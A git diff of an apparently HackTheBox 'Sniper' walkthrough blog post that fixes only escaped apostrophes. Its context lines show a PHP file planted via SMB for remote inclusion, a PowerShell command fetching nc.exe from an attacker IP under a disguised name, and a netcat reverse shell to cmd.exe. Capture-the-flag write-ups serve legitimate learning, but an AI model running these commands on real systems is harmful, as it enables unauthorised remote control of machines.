@@ -160,7 +160,7 @@ bind interfaces only = yes
    force user = nobody
 ```
 
-Let\'s put in the following file in that share and start the service.
+Let's put in the following file in that share and start the service.
 
 ```
 echo '<?php phpinfo(); ?>' > info.php && systemctl start smbd
@@ -186,7 +186,7 @@ We should now be able to put in another PHP file that executes commands remotely
 ![62f39630.png](/assets/images/posts/sniper-htb-walkthrough/62f39630.png)
 </a>
 
-And because there\'s HTML mixed inside the output, I wrote a simple bash script to tidy up the output.
+And because there's HTML mixed inside the output, I wrote a simple bash script to tidy up the output.
 
 <div class="filename"><span>tidy.sh</span></div>
 
@@ -208,7 +208,7 @@ curl -s \
 ![f53edaf5.png](/assets/images/posts/sniper-htb-walkthrough/f53edaf5.png)
 </a>
 
-See? So much neater! Now, let\'s see how we can get a reverse shell. I used the following command to download a copy of `nc.exe` from Kali Linux to `C:\Windows\System32\spool\drivers\color`.
+See? So much neater! Now, let's see how we can get a reverse shell. I used the following command to download a copy of `nc.exe` from Kali Linux to `C:\Windows\System32\spool\drivers\color`.
 
 ```
 # ./tidy.sh 'powershell /c iwr http://10.10.15.171/nc.exe -outf \windows\system32\spool\drivers\color\cute.exe'
@@ -218,7 +218,7 @@ See? So much neater! Now, let\'s see how we can get a reverse shell. I used the 
 ![773212b4.png](/assets/images/posts/sniper-htb-walkthrough/773212b4.png)
 </a>
 
-Sweet. It\'s there. Let's get our reverse shell.
+Sweet. It's there. Let's get our reverse shell.
 
 ```
 # ./tidy.sh 'start \windows\system32\spool\drivers\color\cute.exe 10.10.15.171 1234 -e cmd.exe'
